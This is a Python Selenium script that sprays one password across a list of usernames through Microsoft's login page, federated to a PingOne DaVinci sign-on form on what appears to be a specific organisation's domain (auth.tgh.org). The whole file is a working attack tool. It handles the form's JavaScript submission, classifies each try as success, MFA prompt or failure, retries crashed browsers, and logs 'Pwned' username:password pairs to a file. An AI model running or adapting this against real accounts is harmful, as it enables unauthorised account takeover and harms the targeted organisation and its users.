from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    InvalidSessionIdException,
    NoSuchWindowException,
    WebDriverException,
)
import time
import argparse

LOGIN_URL = "https://login.microsoftonline.com"

# Text rendered by the IdP when the password was wrong / the account is unusable.
FAIL_MARKERS = (
    "invalid", "incorrect", "not recognized", "unable to sign", "try again",
    "locked", "disabled", "expired", "temporarily", "too many",
)
# Markers that mean the password WAS accepted and we hit a second factor.
MFA_MARKERS = (
    "pingid", "authenticat", "verify", "approve", "one-time", "passcode",
    "push", "swipe", "mobile app", "security key",
)
# Selectors DaVinci uses for its error/alert banners.
ERROR_SELECTORS = (
    "[data-id='alert']", ".alert", ".alert-danger", ".error", ".input-error",
    ".sk-alert", "[role='alert']",
)


# Substrings chromedriver uses when the browser/window/renderer is gone. Once we
# see one of these the driver handle is useless - no further command will work,
# so the only correct move is to tear it down and start a fresh browser.
DEAD_SESSION_MARKERS = (
    "invalid session id", "no such window", "target window already closed",
    "web view not found", "chrome not reachable", "disconnected",
    "session deleted", "browser has closed", "unable to connect to renderer",
    "tab crashed", "connection refused",
)


class SessionLost(Exception):
    """The browser died mid-flow; this user got no verdict."""


def is_session_dead(exc):
    if isinstance(exc, (InvalidSessionIdException, NoSuchWindowException)):
        return True
    if not isinstance(exc, WebDriverException):
        return False
    msg = str(getattr(exc, "msg", None) or exc).lower()
    return any(m in msg for m in DEAD_SESSION_MARKERS)


def safe_url(driver):
    """current_url that never raises - the browser may already be gone."""
    try:
        return driver.current_url.split("?")[0]
    except Exception:
        return "<browser session gone>"


def quit_driver(driver):
    """Tear a driver down unconditionally; quit() itself raises on a dead session."""
    if driver is None:
        return
    try:
        driver.quit()
    except Exception:
        pass


def page_alert_text(driver):
    """Collect any visible error/alert text currently rendered by the IdP."""
    seen = []
    for sel in ERROR_SELECTORS:
        for el in driver.find_elements(By.CSS_SELECTOR, sel):
            try:
                if el.is_displayed():
                    txt = (el.text or "").strip()
                    if txt and txt not in seen:
                        seen.append(txt)
            except Exception:
                pass
    return " | ".join(seen)


def classify(driver):
    """
    Decide the outcome of a submitted DaVinci sign-on.
    Returns (status, detail) where status is 'success', 'mfa', 'fail' or None
    (None == not resolved yet, keep polling).
    """
    url = driver.current_url

    # Left the IdP entirely -> password accepted, federation completed.
    if "auth.tgh.org" not in url:
        if "login.microsoftonline.com" in url or "office.com" in url or "microsoft.com" in url:
            return "success", f"redirected back to Microsoft ({url.split('?')[0]})"
        return "success", f"redirected off IdP ({url.split('?')[0]})"

    alert = page_alert_text(driver)
    if alert and any(m in alert.lower() for m in FAIL_MARKERS):
        return "fail", alert

    body = ""
    try:
        body = driver.find_element(By.TAG_NAME, "body").text.lower()
    except Exception:
        pass

    # Password field gone but still on the IdP -> DaVinci advanced to a new screen.
    still_has_password = bool(driver.find_elements(By.ID, "password"))
    if not still_has_password and body:
        if any(m in body for m in MFA_MARKERS):
            return "mfa", (alert or "second-factor screen reached")
        return "mfa", (alert or "advanced past password screen")

    if alert:
        return "fail", alert
    return None, ""


def build_driver(incognito, headless):
    options = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1400,1000")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-first-run")
    options.add_argument("--no-default-browser-check")
    if incognito:
        options.add_argument("--incognito")
    if headless:
        options.add_argument("--headless=new")
    return webdriver.Chrome(options=options)


def spray_once(driver, username, password, output_file, timeout):
    """Run one user through the flow. Raises SessionLost if the browser dies."""
    wait = WebDriverWait(driver, timeout)

    # Step 1: Navigate to Microsoft login page
    driver.get(LOGIN_URL)
    print(f'[*] Navigating to Microsoft login for: {username}')

    # Step 2: Enter username on Microsoft login page
    try:
        username_input = wait.until(
            EC.presence_of_element_located((By.NAME, "loginfmt"))
        )
        username_input.send_keys(username)
        time.sleep(1)

        # Click the "Next" button
        next_button = wait.until(
            EC.element_to_be_clickable((By.ID, "idSIButton9"))
        )
        next_button.click()
    except Exception as e:
        if is_session_dead(e):
            raise SessionLost(e)
        print(f'[-] Failed to submit username at Microsoft login: {e}')
        return

    # Step 3: Wait for the federated redirect away from Microsoft
    print(f'[*] Waiting for PingOne redirect...')
    try:
        wait.until(lambda d: "microsoftonline.com" not in d.current_url)
    except Exception as e:
        if is_session_dead(e):
            raise SessionLost(e)
        print(f'[-] The User: {username} was never redirected to the IdP '
              f'(still at {safe_url(driver)}) - unfederated or unknown user?')
        return

    # Step 4: Fill the DaVinci sign-on form
    try:
        pf_username_input = wait.until(
            EC.element_to_be_clickable((By.ID, "username"))
        )
        pf_username_input.clear()
        pf_username_input.send_keys(username)

        pf_password_input = wait.until(
            EC.element_to_be_clickable((By.ID, "password"))
        )
        pf_password_input.clear()
        pf_password_input.send_keys(password)
    except Exception as e:
        if is_session_dead(e):
            raise SessionLost(e)
        print(f'[-] The User: {username} did not reach the sign-on form: {e}')
        return

    # Step 5: Submit.
    #
    # This form is a PingOne DaVinci widget. A native form.submit() does NOT
    # work: signonForm is method="get" pointing back at its own URL, and the
    # real submission is done by DaVinci's JS click handler, which POSTs to
    # the DaVinci API and then submits the hidden pingOneDaVinciResponseForm.
    # Submitting natively just reloads the page without ever sending creds.
    #
    # #btnSubmit also ships disabled="" and is only enabled by an input/change
    # listener once both fields are non-empty, so wait for it to go enabled.
    try:
        submit_button = wait.until(
            lambda d: (
                lambda b: b if (b and b.is_enabled()
                                and b.get_attribute("aria-disabled") != "true") else False
            )(next(iter(d.find_elements(By.ID, "btnSubmit")), None))
        )
    except Exception as e:
        if is_session_dead(e):
            raise SessionLost(e)
        print(f'[-] The User: {username} - "Sign On" button never became enabled '
              f'(DaVinci validation did not fire)')
        return

    print(f'[*] Spraying The User : {username} !')
    try:
        submit_button.click()
    except Exception as e:
        if is_session_dead(e):
            raise SessionLost(e)
        # Fall back to a real DOM click if the element is overlaid.
        driver.execute_script("document.getElementById('btnSubmit').click();")

    # Step 6: DaVinci answers over XHR, so poll for a resolved outcome.
    #
    # The browser can disappear here - DaVinci sometimes navigates the tab into
    # a window it then closes, and a renderer crash looks the same. Do NOT
    # swallow that: a dead session can never resolve, so bail immediately
    # instead of burning the full timeout on a handle that is already garbage.
    status, detail = None, ""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            status, detail = classify(driver)
        except Exception as e:
            if is_session_dead(e):
                raise SessionLost(e)
            status, detail = None, ""
        if status:
            break
        time.sleep(0.5)

    if status in ("success", "mfa"):
        label = "Pwned" if status == "success" else "Pwned (MFA prompt)"
        print(f'[+] Seems like The User {username} is {label}! {detail}')
        with open(output_file, "a") as f:
            f.write(f'{username}:{password}\t{status}\t{detail}\n')
    elif status == "fail":
        print(f'[-] The User: {username} With The Password: {password} did not Pwned '
              f'({detail})')
    else:
        print(f'[?] The User: {username} - no verdict within {timeout}s '
              f'(url={safe_url(driver)})')


def spray_users(username, password, output_file, incognito, headless, timeout,
                retries=1):
    """
    Drive one user with a throwaway browser. A browser that dies mid-flow is
    retried on a fresh one; anything else is logged and we move to the next user
    so a single bad account can never abort the run.
    """
    for attempt in range(retries + 1):
        driver = None
        try:
            driver = build_driver(incognito, headless)
            spray_once(driver, username, password, output_file, timeout)
            return
        except SessionLost as e:
            if attempt < retries:
                print(f'[!] The User: {username} - browser session died mid-flow, '
                      f'retrying on a fresh browser...')
            else:
                print(f'[?] The User: {username} - browser session died mid-flow, '
                      f'no verdict ({str(e).splitlines()[0]})')
        except Exception as e:
            if is_session_dead(e) and attempt < retries:
                print(f'[!] The User: {username} - browser went away, '
                      f'retrying on a fresh browser...')
                continue
            print(f'[-] The User: {username} - unexpected error, skipping: '
                  f'{type(e).__name__}: {str(e).splitlines()[0]}')
            return
        finally:
            quit_driver(driver)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", required=True, help="Path to the output file for valid sprayed users")
    parser.add_argument("--password", required=True, help="Password to use for spraying")
    parser.add_argument("--users", required=True, help="Path to the input user file")
    parser.add_argument("--incognito", action='store_true', help="Enable incognito mode for the browser")
    parser.add_argument("--headless", action='store_true', help="Enable headless mode for the browser")
    parser.add_argument("--delay", type=float, default=0, help="Seconds to sleep between users")
    parser.add_argument("--timeout", type=int, default=25, help="Per-step wait timeout in seconds")
    parser.add_argument("--retries", type=int, default=1,
                        help="Retries on a fresh browser when the session dies mid-flow")
    args = parser.parse_args()

    with open(args.users, 'r') as file:
        users = [line.strip() for line in file if line.strip()]

    for i, user in enumerate(users):
        try:
            spray_users(user, args.password, args.output, args.incognito,
                        args.headless, args.timeout, args.retries)
        except KeyboardInterrupt:
            print(f'\n[!] Interrupted at user {i + 1}/{len(users)} ({user}) - stopping.')
            break
        except Exception as e:
            # Last-resort guard: no single user may abort the whole spray.
            print(f'[-] The User: {user} - fatal error, skipping: '
                  f'{type(e).__name__}: {str(e).splitlines()[0]}')
        if args.delay and i < len(users) - 1:
            time.sleep(args.delay)
